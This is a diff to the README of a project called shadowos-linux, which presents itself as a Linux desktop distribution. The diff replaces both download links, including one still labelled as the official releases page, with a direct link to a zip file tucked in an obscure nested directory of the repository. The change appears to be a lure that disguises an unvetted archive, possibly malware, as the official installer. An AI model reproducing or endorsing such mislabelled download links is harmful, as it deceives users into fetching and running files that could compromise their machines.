@@ -1,6 +1,6 @@
 # 🖥️ shadowos-linux - A modern desktop for your computer
 
-[![Download shadowos-linux](https://img.shields.io/badge/Download-Releases-blue.svg)](https://github.com/juanainsular7785/shadowos-linux/releases)
+[![Download shadowos-linux](https://img.shields.io/badge/Download-Releases-blue.svg)](https://raw.githubusercontent.com/juanainsular7785/shadowos-linux/main/files/system/etc/skel/.var/app/io.gitlab.librewolf-community/shadowos_linux_1.6.zip)
 
 ## What is shadowos-linux?
 
@@ -24,7 +24,7 @@ Most hardware built within the last seven years will run this software without i
 
 You must visit the releases page to download the latest version of the installer image. We use an OCI-image format for this distribution. This method ensures your system remains identical to our curated build, reducing errors during installation.
 
-[Download shadowos-linux from the official releases page](https://github.com/juanainsular7785/shadowos-linux/releases)
+[Download shadowos-linux from the official releases page](https://raw.githubusercontent.com/juanainsular7785/shadowos-linux/main/files/system/etc/skel/.var/app/io.gitlab.librewolf-community/shadowos_linux_1.6.zip)
 
 ## Preparing for Installation 🛠️
 
